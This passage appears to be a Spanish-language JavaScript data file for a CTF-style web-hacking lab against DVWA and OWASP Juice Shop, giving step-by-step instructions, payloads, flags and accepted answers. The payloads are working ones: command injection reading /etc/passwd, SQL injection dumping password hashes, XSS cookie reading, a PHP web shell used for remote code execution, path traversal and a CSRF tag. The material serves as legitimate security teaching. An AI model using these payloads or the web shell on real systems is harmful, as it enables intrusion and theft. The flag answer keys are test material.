            objetivoFlag: 'Ingresa la flag cuando veas "www-data" impreso en la respuesta como resultado del comando whoami ejecutado en el servidor.'
          },
          {
            numero: 3,
            titulo: 'Extraer cuentas del sistema operativo',
            como: `Donde se hace: En la casilla "Enter an IP address" de Command Injection en DVWA.

Objetivo: Leer el archivo confidencial /etc/passwd del sistema Linux de la Raspberry Pi para listar las cuentas de usuario existentes.

Paso a paso:
1. En la casilla de texto, escribe la orden para leer el archivo del sistema:
   127.0.0.1; cat /etc/passwd
2. Haz clic en el botón "Submit".
3. La página mostrará una lista completa de cuentas del sistema operativo, comenzando por el superusuario root:x:0:0:root:...

¿Cuál es la lección de seguridad?: Nunca se debe concatenar directamente la entrada de un usuario en un comando del sistema. Los atacantes pueden usar esto para tomar control absoluto del servidor.`,
            payload: '127.0.0.1; cat /etc/passwd',
            flag: 'FLAG{cmdi-etcpasswd-dumped}',
            dondeEncontrarla: 'En la salida de texto en pantalla, observando la primera cuenta del archivo con UID 0.',
            quePoner: 'Escribe el nombre del superusuario con UID 0 que aparece al inicio: root',
            flagsAceptadas: ["root", "root:x:0:0:root", "FLAG{root}", "FLAG{cmdi-etcpasswd-dumped}"],
            objetivoFlag: 'Ingresa la flag cuando veas el contenido de /etc/passwd mostrado en la pagina, con lineas como "root:x:0:0:root" y "www-data:x:33:33".'
          }
        ]
      },
      {
        id: 'dvwa-sqli',
        numero: 3,
        titulo: 'Inyeccion SQL',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Provocar fallo de sintaxis en la consulta',
            como: `Donde se hace: En Firefox, en la sección "SQL Injection" de DVWA.

Objetivo: Romper intencionalmente la consulta de base de datos introduciendo una comilla simple (') para comprobar si la entrada no está protegida.

Paso a paso:
1. En el menú de DVWA, haz clic en "SQL Injection".
2. En la casilla "User ID", escribe únicamente una comilla simple: '
3. Haz clic en el botón "Submit".
4. Verás aparecer un mensaje de error técnico de base de datos en color rojo o negro:
   You have an error in your SQL syntax; check the manual that corresponds to your MariaDB/MySQL server version...

¿Por qué ocurre esto?: El programador escribió internamente algo como SELECT ... WHERE user_id = '$id'. Al enviar una comilla, la consulta queda con tres comillas desparejadas, la base de datos se confunde y arroja error. ¡Eso confirma que el campo es vulnerable!`,
            payload: "'",
            flag: 'FLAG{sqli-mysql-error-visible}',
            dondeEncontrarla: 'En el mensaje de error de sintaxis SQL que aparece en la página.',
            quePoner: 'Escribe el motor de base de datos mencionado en el error: MySQL (o MariaDB)',
            flagsAceptadas: ["MySQL", "mysql", "MariaDB", "mariadb", "FLAG{sqli-mysql-error-visible}"],
            objetivoFlag: 'Ingresa la flag cuando veas el mensaje de error SQL de MySQL en la pagina, con texto como "You have an error in your SQL syntax".'
          },
          {
            numero: 2,
            titulo: 'Evasion booleana de la condicion',
            como: `Donde se hace: En la casilla "User ID" de SQL Injection en DVWA.

Objetivo: Hacer que la base de datos nos devuelva TODOS los usuarios en lugar de uno solo, usando una condición lógica que siempre sea verdadera ('1'='1').

Paso a paso:
1. En la casilla "User ID", escribe exactamente:
   1' OR '1'='1
2. Haz clic en "Submit".
3. En vez de mostrarte solo un registro, la página te devolverá la lista completa de todos los usuarios de la base de datos: admin, gordonb, 1337, pablo, smithy.

¿Por qué funciona?: La consulta se transforma en: "Trae el usuario 1 O donde 1 sea igual a 1". Como uno siempre es igual a uno en matemáticas, la condición se cumple para todas las filas y la base de datos devuelve la tabla entera.`,
            payload: "1' OR '1'='1",
            flag: 'FLAG{sqli-all-users-bypassed}',
            dondeEncontrarla: 'En la lista de resultados de usuarios devuelta por DVWA.',
            quePoner: 'Escribe el primer nombre de usuario que aparece en la lista: admin',
            flagsAceptadas: ["admin", "Admin", "FLAG{admin}", "FLAG{sqli-all-users-bypassed}"],
            objetivoFlag: 'Ingresa la flag cuando la pagina muestre todos los usuarios de la base de datos (admin, gordonb, 1337, pablo, smithy) en una sola respuesta.'
          },
          {
            numero: 3,
            titulo: 'Determinar numero de columnas con ORDER BY',
            como: `Donde se hace: En la casilla "User ID" de SQL Injection en DVWA.

Objetivo: Averiguar cuántas columnas devuelve la consulta original (un dato fundamental antes de poder pedirle contraseñas a la base de datos).

Paso a paso:
1. En "User ID", escribe: 1' ORDER BY 1 # y haz clic en Submit (verás que responde bien).
2. Ahora escribe: 1' ORDER BY 2 # y haz clic en Submit (sigue respondiendo bien).
3. Ahora escribe: 1' ORDER BY 3 # y haz clic en Submit: la página dará un error como "Unknown column '3' in 'order list'".

¿Qué significa esto?: Cuando ordenas por 2 columnas funciona, pero al pedir la columna 3 falla. Eso demuestra que la consulta original tiene exactamente 2 columnas. El símbolo # sirve para anular o comentar el resto del código SQL original.`,
            payload: "1' ORDER BY 2 #",
            flag: 'FLAG{sqli-2-columns-confirmed}',
            dondeEncontrarla: 'Al verificar con qué número responde bien y con cuál da error de columna desconocida.',
            quePoner: 'Escribe el número exacto de columnas que contiene la consulta: 2',
            flagsAceptadas: ["2", "dos", "2 columnas", "FLAG{sqli-2-columns-confirmed}"],
            objetivoFlag: 'Ingresa la flag cuando ORDER BY 2 funcione sin error pero ORDER BY 3 devuelva error, confirmando que la consulta tiene exactamente 2 columnas.'
          },
          {
            numero: 4,
            titulo: 'Extraer usuarios y hashes de contrasenas',
            como: `Donde se hace: En la casilla "User ID" de SQL Injection en DVWA.

Objetivo: Usar la cláusula UNION SELECT para robar los usuarios y las contraseñas cifradas guardadas en la tabla users.

Paso a paso:
1. En la casilla "User ID", escribe:
   1' UNION SELECT user, password FROM users #
2. Haz clic en "Submit".
3. La página mostrará los nombres de usuario acompañados por sus contraseñas en formato hash MD5 (un texto largo de 32 caracteres).
4. Para el usuario admin, verás el hash:
   5f4dcc3b5aa765d61d8327deb882cf99
   (este hash corresponde a la palabra "password").

¿Cómo funciona UNION SELECT?: UNION permite combinar el resultado de la consulta original con una consulta propia. Como ya sabíamos que requería 2 columnas, le pedimos las columnas user y password de la tabla users.`,
            payload: "1' UNION SELECT user, password FROM users #",
            flag: 'FLAG{sqli-md5-hashes-dumped}',
            dondeEncontrarla: 'En la tabla de resultados de DVWA junto al usuario admin.',
            quePoner: 'Escribe el hash MD5 de la contraseña de admin: 5f4dcc3b5aa765d61d8327deb882cf99',
            flagsAceptadas: ["5f4dcc3b5aa765d61d8327deb882cf99", "FLAG{5f4dcc3b5aa765d61d8327deb882cf99}", "FLAG{sqli-md5-hashes-dumped}"],
            objetivoFlag: 'Ingresa la flag cuando veas los hashes MD5 de las contrasenas en la pagina, por ejemplo el hash "5f4dcc3b5aa765d61d8327deb882cf99" junto al usuario admin.'
          }
        ]
      },
      {
        id: 'dvwa-xss-reflected',
        numero: 4,
        titulo: 'Cross-Site Scripting Reflejado',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Identificar punto de reflexion de datos',
            como: `Donde se hace: En Firefox, en la sección "XSS (Reflected)" de DVWA.

Objetivo: Comprobar si el texto que ingresas en el formulario es devuelto e impreso tal cual por el servidor en la página web.

Paso a paso:
1. En el menú de DVWA, entra a "XSS (Reflected)".
2. En la casilla que dice "What's your name?", escribe: PruebaLab
3. Haz clic en el botón "Submit".
4. Verás que la página responde con un saludo que dice: Hello PruebaLab.

¿Por qué es un riesgo?: Si el servidor imprime lo que tú le mandas sin "desinfectarlo" (sanitizar caracteres especiales como < o >), un atacante puede inyectar código de programación en vez de un simple nombre.`,
            payload: 'PruebaLab',
            flag: 'FLAG{xss-reflected-hello-pruebalab}',
            dondeEncontrarla: 'En el saludo de respuesta que aparece en la página tras pulsar Submit.',
            quePoner: 'Escribe la frase completa de saludo reflejada en pantalla: Hello PruebaLab',
            flagsAceptadas: ["Hello PruebaLab", "hello pruebalab", "PruebaLab", "FLAG{xss-reflected-hello-pruebalab}"],
            objetivoFlag: 'Ingresa la flag cuando la pagina muestre exactamente "Hello PruebaLab" como respuesta, confirmando que el servidor refleja tu entrada sin sanitizacion.'
          },
          {
            numero: 2,
            titulo: 'Inyectar codigo JavaScript ejecutable',
            como: `Donde se hace: En la misma casilla "What's your name?" de XSS (Reflected).

Objetivo: Hacer que el navegador ejecute una ventana emergente de alerta utilizando una etiqueta <script> de JavaScript.

Paso a paso:
1. En la casilla "What's your name?", escribe exactamente:
   <script>alert('XSS')</script>
2. Haz clic en el botón "Submit".
3. En la parte superior de tu navegador saltará una ventana emergente (pop-up) con el texto "XSS".

¿Qué acaba de pasar?: El navegador web no diferenció entre el contenido normal de la página y tu código inyectado; creyó que era una instrucción legítima de los creadores de la web y ejecutó la función alert('XSS').`,
            payload: "<script>alert('XSS')</script>",
            flag: 'FLAG{xss-alert-executed-success}',
            dondeEncontrarla: 'En el cuadro emergente de alerta que salta en la parte superior del navegador.',
            quePoner: 'Escribe el texto que aparece dentro de la alerta emergente: XSS',
            flagsAceptadas: ["XSS", "xss", "FLAG{xss-alert-executed-success}"],
            objetivoFlag: 'Ingresa la flag cuando veas el cuadro de alerta emergente con el texto "XSS" en tu navegador al hacer Submit del payload.'
          },
          {
            numero: 3,
            titulo: 'Demostrar robo de cookie de sesion',
            como: `Donde se hace: En la misma casilla "What's your name?" de XSS (Reflected).

Objetivo: Demostrar cómo un atacante puede usar XSS para leer las cookies secretas que mantienen iniciada tu sesión en la web.

Paso a paso:
1. En la casilla "What's your name?", escribe:
   <script>alert(document.cookie)</script>
2. Haz clic en "Submit".
3. En la ventana emergente verás tu identificador de sesión: security=low; PHPSESSID=...

¿Cuál es el peligro real de esto?: Si un atacante convence a una víctima de hacer clic en un enlace con este código, el script puede enviar en secreto esa cookie a su propio servidor y entrar a la cuenta de la víctima sin saber su contraseña.`,
            payload: '<script>alert(document.cookie)</script>',
            flag: 'FLAG{xss-cookie-phpsessid-leaked}',
            dondeEncontrarla: 'En la ventana emergente generada al ejecutar document.cookie.',
            quePoner: 'Escribe el nombre de la cookie de sesión de PHP: PHPSESSID',
            flagsAceptadas: ["PHPSESSID", "phpsessid", "FLAG{xss-cookie-phpsessid-leaked}"],
            objetivoFlag: 'Ingresa la flag cuando el alert emergente muestre tu valor de PHPSESSID (por ejemplo: "security=low; PHPSESSID=abc123..."), confirmando el robo de sesion.'
          }
        ]
      },
      {
        id: 'dvwa-xss-stored',
        numero: 5,
        titulo: 'Cross-Site Scripting Almacenado',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Modificar limite de caracteres en el navegador',
            como: `Donde se hace: En Firefox, en la sección "XSS (Stored)" de DVWA.

Objetivo: Usar las herramientas de desarrollo del navegador (F12) para quitar una restricción visual que limita a 10 letras lo que podemos escribir.

Paso a paso:
1. En el menú de DVWA, haz clic en "XSS (Stored)".
2. Verás un libro de visitas con los campos "Name" (Nombre) y "Message" (Mensaje). Si intentas escribir en "Name", verás que se detiene al llegar a 10 caracteres.
3. Haz clic derecho sobre la casilla "Name" y selecciona "Inspeccionar" (o presiona F12).
4. En el código HTML que se abre abajo, verás la etiqueta: <input name="txtName" ... maxlength="10">.
5. Haz doble clic sobre el número 10 y cámbialo por 200. Presiona Enter.
6. Ahora podrás escribir textos mucho más largos en el campo "Name".

Lección de seguridad para principiantes: Las protecciones puestas solo en el HTML del navegador (del lado del cliente) nunca son seguras, porque cualquier persona las puede modificar con las herramientas de desarrollador.`,
            payload: 'maxlength="200"',
            flag: 'FLAG{xss-stored-maxlength-bypassed}',
            dondeEncontrarla: 'En las herramientas de desarrollo (F12 -> Inspector) sobre la etiqueta input del campo Name.',
            quePoner: 'Escribe el nombre del atributo HTML que limitaba los caracteres: maxlength',
            flagsAceptadas: ["maxlength", "max-length", "MAXLENGTH", "FLAG{xss-stored-maxlength-bypassed}"],
            objetivoFlag: 'Ingresa la flag cuando hayas modificado el atributo maxlength a 200 en DevTools y el campo "Name" acepte mas de 10 caracteres sin restriccion.'
          },
          {
            numero: 2,
            titulo: 'Guardar el payload en la base de datos',
            como: `Donde se hace: En el formulario de "Guestbook" de XSS (Stored) en DVWA.

Objetivo: Guardar de forma permanente un código JavaScript en la base de datos MySQL del servidor de la Raspberry Pi.

Paso a paso:
1. En la casilla "Name", escribe exactamente:
   <script>alert('Stored')</script>
2. En la casilla "Message", escribe cualquier mensaje como: Hola mundo
3. Haz clic en el botón "Sign Guestbook".
4. Al instante saltará una ventana emergente que dice "Stored".

¿Por qué es "Almacenado"?: A diferencia del XSS Reflejado (que desaparece en un segundo), el servidor guardó este comentario en su base de datos. Cada vez que alguien visite esta página, su navegador cargará el comentario y ejecutará el script.`,
            payload: "Name: <script>alert('Stored')</script>\nMessage: Hola",
            flag: 'FLAG{xss-stored-payload-saved-db}',
            dondeEncontrarla: 'En la ventana de alerta que salta al hacer clic en Sign Guestbook.',
            quePoner: 'Escribe la palabra configurada dentro de la alerta: Stored',
            flagsAceptadas: ["Stored", "stored", "STORED", "FLAG{xss-stored-payload-saved-db}"],
            objetivoFlag: 'Ingresa la flag cuando al hacer "Sign Guestbook" el alert emergente con "Stored" se dispare automaticamente, confirmando que el script fue guardado en la BD.'
          },
          {
            numero: 3,
            titulo: 'Verificar persistencia del ataque',
            como: `Donde se hace: En el navegador Firefox.

Objetivo: Comprobar que el ataque quedó guardado permanentemente y se ejecuta de manera automática cada vez que se carga la página.

Paso a paso:
1. Presiona la tecla F5 para recargar la página (o abre una ventana de incógnito y entra a la misma sección).
2. Observa cómo la ventana emergente con "Stored" se dispara automáticamente sin que tengas que volver a escribir nada.

Impacto de esta vulnerabilidad: En una red social o foro real, cualquier persona que entre a leer los comentarios resultaría atacada automáticamente, sin necesidad de hacer ningún clic sospechoso.`,
            payload: 'F5 / Recargar pagina',
            flag: 'FLAG{xss-stored-persists-on-reload}',
            dondeEncontrarla: 'Al recargar la página con F5 o abrirla en una ventana privada.',
            quePoner: 'Escribe el texto de la alerta que se vuelve a disparar al recargar: Stored',
            flagsAceptadas: ["Stored", "stored", "FLAG{xss-stored-persists-on-reload}"],
            objetivoFlag: 'Ingresa la flag cuando al recargar la pagina XSS Stored (o abrirla en ventana privada) el alert "Stored" se ejecute automaticamente sin intervenir.'
          }
        ]
      },
      {
        id: 'dvwa-upload',
        numero: 6,
        titulo: 'Subida de Archivos y Web Shell',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Crear archivo Web Shell en PHP',
            como: `Donde se hace: En tu máquina Kali Linux (en una terminal).

Objetivo: Crear un archivo de una sola línea en lenguaje PHP que nos permita enviarle órdenes a la Raspberry Pi a través de la web.

Paso a paso:
1. En Kali Linux, abre una terminal.
2. Crea el archivo ejecutando este comando:
   echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' > shell.php
3. Comprueba que el archivo se haya creado correctamente viendo su contenido:
   cat shell.php

¿Qué es una Web Shell?: Es un pequeño script que le dice al servidor: "Si alguien visita esta página y añade en la URL el parámetro ?cmd=un_comando, pásalo a la función system() de Linux para que lo ejecute".`,
            payload: '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>',
            flag: 'FLAG{webshell-php-file-created}',
            dondeEncontrarla: 'En tu terminal de Kali Linux al verificar el contenido con cat shell.php.',
            quePoner: 'Escribe el nombre de la función de PHP usada para ejecutar órdenes: system',
            flagsAceptadas: ["system", "system()", "FLAG{webshell-php-file-created}"],
            objetivoFlag: 'Ingresa la flag cuando hayas creado el archivo shell.php en tu Kali Linux y puedas verificar su contenido con "cat shell.php" en la terminal.'
          },
          {
            numero: 2,
            titulo: 'Subir el archivo al servidor',
            como: `Donde se hace: En Firefox, en la sección "File Upload" de DVWA.

Objetivo: Subir nuestro archivo shell.php al servidor web aprovechando que el formulario no valida si es una imagen real.

Paso a paso:
1. En el menú de DVWA, haz clic en "File Upload".
2. Haz clic en el botón "Examinar..." o "Seleccionar archivo" y busca tu archivo shell.php.
3. Haz clic en el botón "Upload".
4. Aparecerá un mensaje azul o verde confirmando que el archivo fue subido con éxito:
   ../../hackable/uploads/shell.php succesfully uploaded!

¿Por qué es un fallo grave?: Un formulario de fotos de perfil jamás debería permitir subir archivos con extensión .php. Al no comprobar el tipo de archivo, el servidor lo guarda listo para ser ejecutado.`,
            payload: 'Archivo: shell.php',
            flag: 'FLAG{webshell-uploaded-to-server}',
            dondeEncontrarla: 'En el mensaje verde de éxito que muestra DVWA tras hacer clic en Upload.',
            quePoner: 'Escribe la ruta donde se guardó el archivo: ../../hackable/uploads/shell.php (o simplemente hackable/uploads/shell.php)',
            flagsAceptadas: ["../../hackable/uploads/shell.php", "hackable/uploads/shell.php", "FLAG{webshell-uploaded-to-server}"],
            objetivoFlag: 'Ingresa la flag cuando DVWA muestre el mensaje de exito indicando que el archivo fue subido a "../../hackable/uploads/shell.php".'
          },
          {
            numero: 3,
            titulo: 'Ejecutar comandos en la Raspberry Pi',
            como: `Donde se hace: En la barra de direcciones de tu navegador Firefox.

Objetivo: Usar nuestra Web Shell para ejecutar comandos en el sistema operativo del servidor directamente desde la URL.

Paso a paso:
1. En la barra de direcciones de tu navegador, ve a la ruta donde se guardó el archivo y añade el comando ?cmd=id al final:
   http://<IP_LAB>/dvwa/hackable/uploads/shell.php?cmd=id
2. Presiona Enter.
3. Verás en pantalla la respuesta devuelta por Linux en la Raspberry Pi:
   uid=33(www-data) gid=33(www-data) groups=33(www-data)

¿Qué significa esto?: Has conseguido lo que en ciberseguridad se conoce como RCE (Remote Code Execution o Ejecución Remota de Código): control total para mandar órdenes al servidor desde cualquier parte de la red.`,
            payload: 'http://<IP_LAB>/dvwa/hackable/uploads/shell.php?cmd=id',
            flag: 'FLAG{webshell-rce-uid-www-data}',
            dondeEncontrarla: 'En el navegador, al visitar la URL con ?cmd=id y ver la respuesta de uid.',
            quePoner: 'Escribe el número de usuario (uid) de www-data que viste: 33',
            flagsAceptadas: ["33", "uid=33", "uid=33(www-data)", "FLAG{webshell-rce-uid-www-data}"],
            objetivoFlag: 'Ingresa la flag cuando tu web shell devuelva en el navegador la linea "uid=33(www-data) gid=33(www-data)" como resultado del comando id.'
          }
        ]
      },
      {
        id: 'dvwa-fi',
        numero: 7,
        titulo: 'Inclusion Local de Archivos (LFI)',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Analizar el parametro de inclusion',
            como: `Donde se hace: En Firefox, en la sección "File Inclusion" de DVWA.

Objetivo: Descubrir cómo decide la aplicación web qué archivo debe cargar y mostrar en la pantalla.

Paso a paso:
1. En el menú de DVWA, entra a "File Inclusion".
2. Verás tres enlaces de ejemplo: "file1.php", "file2.php", "file3.php". Haz clic en cualquiera de ellos.
3. Observa atentamente la barra de direcciones de tu navegador:
   http://<IP_LAB>/dvwa/vulnerabilities/fi/?page=file1.php

¿Qué significa esto?: La aplicación utiliza un parámetro llamado ?page= para pedirle al servidor qué archivo debe leer y mostrar.`,
            payload: '?page=include.php',
            flag: 'FLAG{lfi-page-param-identified}',
            dondeEncontrarla: 'En la barra de direcciones de tu navegador al hacer clic en los enlaces de File Inclusion.',
            quePoner: 'Escribe el nombre del parámetro en la URL: page',
            flagsAceptadas: ["page", "page=", "?page", "FLAG{lfi-page-param-identified}"],
            objetivoFlag: 'Ingresa la flag cuando confirmes en la URL del navegador que la pagina usa el parametro ?page= para cargar archivos (ej: .../file_inclusion/?page=file1.php).'
          },
          {
            numero: 2,
            titulo: 'Escapar del directorio raiz (Path Traversal)',
            como: `Donde se hace: En la barra de direcciones de Firefox.

Objetivo: Usar la técnica de los dos puntos y barra (../) para salir de la carpeta web y leer un archivo confidencial del sistema operativo.

Paso a paso:
1. En la barra de direcciones, cambia file1.php por una serie de saltos hacia atrás seguidos de /etc/passwd:
   ../../../../../../../../etc/passwd
2. Presiona Enter.
3. Verás impreso en pantalla el listado de usuarios del sistema Linux (root:x:0:0:root:... y su terminal /bin/bash).

¿Por qué funciona?: Cada ../ significa "sube un nivel de carpeta hacia atrás". Poniendo varios seguidos, llegamos a la raíz del disco duro (/) y desde ahí abrimos el archivo /etc/passwd. Esto se conoce como Directory Traversal.`,
            payload: '?page=../../../../../../../../etc/passwd',
            flag: 'FLAG{lfi-etcpasswd-file-read}',
            dondeEncontrarla: 'En la página de DVWA tras incluir /etc/passwd, en la línea de root.',
            quePoner: 'Escribe la terminal o intérprete asignado a root: /bin/bash (o bin/bash)',
            flagsAceptadas: ["/bin/bash", "bin/bash", "bash", "FLAG{lfi-etcpasswd-file-read}"],
            objetivoFlag: 'Ingresa la flag cuando la pagina muestre el contenido de /etc/passwd del servidor, con lineas como "root:x:0:0:root:/root:/bin/bash".'
          },
          {
            numero: 3,
            titulo: 'Extraer codigo fuente con Wrapper Base64',
            como: `Donde se hace: En la barra de direcciones de Firefox.

Objetivo: Descargar el código fuente en PHP de un archivo sin que el servidor lo ejecute, convirtiéndolo a texto Base64.

Paso a paso:
1. En la barra de direcciones, cambia el valor de ?page= por este filtro especial de PHP:
   ?page=php://filter/convert.base64-encode/resource=index.php
2. Presiona Enter.
3. La pantalla se llenará con una cadena larga de texto codificada en Base64 que comienza por PD9waHA...
4. Al decodificar esa cadena (por ejemplo en la herramienta CyberChef o con el comando base64 -d), obtendrás el código fuente original del archivo index.php (con <?php).

¿Para qué sirve esto a un auditor?: Normalmente si intentas abrir un archivo .php con LFI, el servidor lo ejecuta y no te muestra su código. Con este filtro, el servidor lo convierte a texto plano Base64 antes de procesarlo, permitiéndote auditar el código fuente.`,
            payload: '?page=php://filter/convert.base64-encode/resource=index.php',
            flag: 'FLAG{lfi-base64-source-code-exposed}',
            dondeEncontrarla: 'En la respuesta de la página donde aparece la cadena en Base64.',
            quePoner: 'Escribe los primeros 7 caracteres de la cadena Base64 que viste: PD9waHA',
            flagsAceptadas: ["PD9waHA", "pd9wah", "FLAG{lfi-base64-source-code-exposed}"],
            objetivoFlag: 'Ingresa la flag cuando la pagina devuelva una larga cadena en Base64 comenzando con "PD9waHA" (<?php en base64), que es el codigo fuente de index.php.'
          }
        ]
      },
      {
        id: 'dvwa-csrf',
        numero: 8,
        titulo: 'Falsificacion de Peticiones (CSRF)',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Analizar peticion de cambio de contrasena',
            como: `Donde se hace: En Firefox, en la sección "CSRF" de DVWA.

Objetivo: Comprender cómo cambia la contraseña DVWA y comprobar que carece de protección anti-CSRF.

Paso a paso:
1. En el menú de DVWA, entra a "CSRF".
2. Escribe una nueva contraseña en ambos campos (por ejemplo: 123) y haz clic en "Change".
3. Revisa la barra de direcciones del navegador:
   .../csrf/?password_new=123&password_conf=123&Change=Change

¿Dónde está el fallo?: La solicitud se envía por método GET y no incluye ningún token temporal secreto (código anti-CSRF). Cualquier sitio web externo puede recrear este enlace exacto.`,
            payload: 'GET /dvwa/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change',
            flag: 'FLAG{csrf-get-no-token-confirmed}',
            dondeEncontrarla: 'En la barra de direcciones de tu navegador tras presionar Change.',
            quePoner: 'Escribe el nombre del parámetro que envía la nueva contraseña: password_new',
            flagsAceptadas: ["password_new", "password_conf", "FLAG{csrf-get-no-token-confirmed}"],
            objetivoFlag: 'Ingresa la flag cuando veas en la barra de direcciones la peticion GET con los parametros password_new y password_conf expuestos en la URL tras hacer "Change".'
          },
          {
            numero: 2,
            titulo: 'Construir vector de ataque HTML',
            como: `Donde se hace: En tu editor de texto o en el navegador.

Objetivo: Entender cómo una página web trampa puede obligar al navegador de una víctima a cambiar su contraseña sin su consentimiento.

Paso a paso:
1. Un atacante puede crear un archivo HTML sencillo con una etiqueta de imagen invisible:
   <img src="http://<IP_LAB>/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">
2. Si un usuario con sesión abierta en DVWA visita esa página trampa, su navegador intentará "cargar la imagen", ejecutando en realidad la orden de cambio de contraseña a "hacked".
3. Al visitar esa URL directamente en el navegador, verás el mensaje verde de confirmación:
   Password Changed.

¿Por qué se llama CSRF?: Significa Cross-Site Request Forgery (Falsificación de Peticiones en Sitios Cruzados). El usuario nunca quiso cambiar su contraseña, pero el sitio malicioso falsificó la petición en su nombre aprovechando su sesión abierta.`,
            payload: '<img src="http://<IP_LAB>/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">',
            flag: 'FLAG{csrf-exploit-html-password-changed}',
            dondeEncontrarla: 'En el mensaje de confirmación que muestra DVWA tras cambiar la contraseña.',
            quePoner: 'Escribe el mensaje de éxito que muestra DVWA: Password Changed.',
            flagsAceptadas: ["Password Changed.", "Password Changed", "password changed.", "FLAG{csrf-exploit-html-password-changed}"],
            objetivoFlag: 'Ingresa la flag cuando al abrir tu exploit.html en el navegador, DVWA muestre el mensaje "Password Changed." confirmando que el ataque CSRF funciono.'
          }
        ]
      }
    ]
  },
  'OWASP Juice Shop': {
    nombre: 'OWASP Juice Shop',
    categoria: 'SPA Moderna & API REST',
    modulos: [
      {
        id: 'juice-recon',
        numero: 1,
        titulo: 'Reconocimiento y Score Board',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Configurar filtro de trafico JSON en Burp y acceder a Juice Shop',
            como: `Donde se hace: En Burp Suite y Firefox.

Objetivo: Conectarse a la tienda moderna OWASP Juice Shop y filtrar las peticiones para enfocarnos únicamente en su API REST (datos JSON), ocultando imágenes y estilos.

Paso a paso:
1. Abre Firefox con FoxyProxy en modo "Burp".
2. Entra a Juice Shop en tu Raspberry Pi: http://<IP_PI>:3000
3. En Burp Suite, ve a "Proxy" -> "HTTP history".
4. Haz clic en la barra gris superior que dice "Filter: ...".
5. En la ventana de filtros, asegúrate de marcar "JSON" y "Fetch/XHR" para ocultar imágenes y archivos estáticos. Haz clic en "Apply".

¿Por qué hacemos esto?: Juice Shop es una aplicación moderna (Single Page Application). La interfaz en Angular habla con el servidor mediante peticiones en formato JSON.`,
            payload: 'http://<IP_PI>:3000\nFiltro Burp: JSON / Fetch / XHR',
            flag: 'FLAG{juice-burp-json-filter-active}',
            dondeEncontrarla: 'En Burp Suite en Proxy -> HTTP history tras activar el filtro JSON / Fetch / XHR.',
            quePoner: 'Escribe el formato de datos de la API que filtramos: JSON',
            flagsAceptadas: ["JSON", "json", "FLAG{juice-burp-json-filter-active}"],
            objetivoFlag: 'Ingresa la flag cuando Juice Shop cargue en el navegador y en Burp HTTP history solo veas peticiones de tipo JSON/XHR (sin CSS, JS ni imagenes).'
          },
          {
            numero: 2,
            titulo: 'Buscar ruta oculta del Score Board',
            como: `Donde se hace: En el navegador Firefox usando las herramientas de desarrollador (F12).

Objetivo: Inspeccionar el código JavaScript de la aplicación para encontrar la ruta secreta que lleva al panel de retos oficial.

Paso a paso:
1. En la pestaña de Juice Shop en Firefox, presiona F12 para abrir las herramientas de desarrollador.
2. Presiona las teclas Ctrl + Shift + F (o Cmd + Option + F en Mac) para abrir la búsqueda global en todos los archivos.
3. En la barra de búsqueda escribe: score-board y presiona Enter.
4. Verás resultados dentro de un archivo JavaScript (como main.js), donde el enrutador de Angular define la ruta: path: 'score-board'.`,
            payload: 'Buscar: score-board\nAtajo DevTools: Ctrl + Shift + F',
            flag: 'FLAG{juice-scoreboard-route-found}',
            dondeEncontrarla: 'En DevTools (F12 -> búsqueda con Ctrl+Shift+F), localizando la ruta en el código de Angular.',
            quePoner: 'Escribe el nombre de la ruta que encontraste: score-board',
            flagsAceptadas: ["score-board", "score board", "#/score-board", "FLAG{juice-scoreboard-route-found}"],
            objetivoFlag: 'Ingresa la flag cuando localices en DevTools la definicion de la ruta "score-board" dentro del archivo de JavaScript del bundle de Angular (main.js).'
          },
          {
            numero: 3,
            titulo: 'Desbloquear panel de retos',
            como: `Donde se hace: En la barra de direcciones de Firefox.

Objetivo: Visitar la ruta oculta y desbloquear el Score Board con la primera insignia de reto completado.

Paso a paso:
1. En la barra de direcciones de Juice Shop, añade /#/score-board al final:
   http://<IP_PI>:3000/#/score-board
2. Presiona Enter.
3. Verás una notificación emergente con confeti felicitándote por resolver el primer reto: "Find the carefully hidden 'Score Board' page".
4. En el panel aparecerá la tarjeta marcada con una insignia verde de "Solved" (Resuelto).`,
            payload: 'http://<IP_LAB>/#/score-board',
            flag: 'FLAG{juice-scoreboard-challenge-1-solved}',
            dondeEncontrarla: 'En el Score Board de Juice Shop tras acceder a /#/score-board.',
            quePoner: 'Escribe la palabra que indica que el reto está resuelto: Solved (o Score Board)',
            flagsAceptadas: ["Score Board", "Solved", "solved", "score-board", "FLAG{juice-scoreboard-challenge-1-solved}"],
            objetivoFlag: 'Ingresa la flag cuando accedas al Score Board y veas la primera tarjeta de reto marcada como resuelta (estrella verde o texto "Solved") en el panel.'
          }
        ]
      },
      {
        id: 'juice-sqli',
        numero: 2,
        titulo: 'Inyeccion SQL en API JSON',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Interceptar peticion de login en Burp Suite',
            como: `Donde se hace: En Firefox y Burp Suite.

Objetivo: Observar cómo viajan las credenciales hacia una API REST moderna en formato JSON cuando intentas iniciar sesión.

Paso a paso:
1. En Juice Shop, haz clic en "Account" (arriba a la derecha) y luego en "Login".
2. En Burp Suite, ve a "Proxy" -> "Intercept" y activa "Intercept is on".
3. En el formulario de login de Juice Shop escribe un email cualquiera (test@test.com) y una contraseña cualquiera (123), y haz clic en "Log in".
4. Cambia a Burp Suite: verás la petición POST /rest/user/login con un cuerpo JSON conteniendo {"email":"test@test.com","password":"123"}.`,
            payload: 'POST /rest/user/login\n{"email":"test@test.com","password":"123"}',
            flag: 'FLAG{juice-sqli-post-intercepted}',
            dondeEncontrarla: 'En Burp Suite en Proxy -> Intercept, observando la primera línea de la petición POST.',
            quePoner: 'Escribe la ruta del endpoint de login: /rest/user/login',
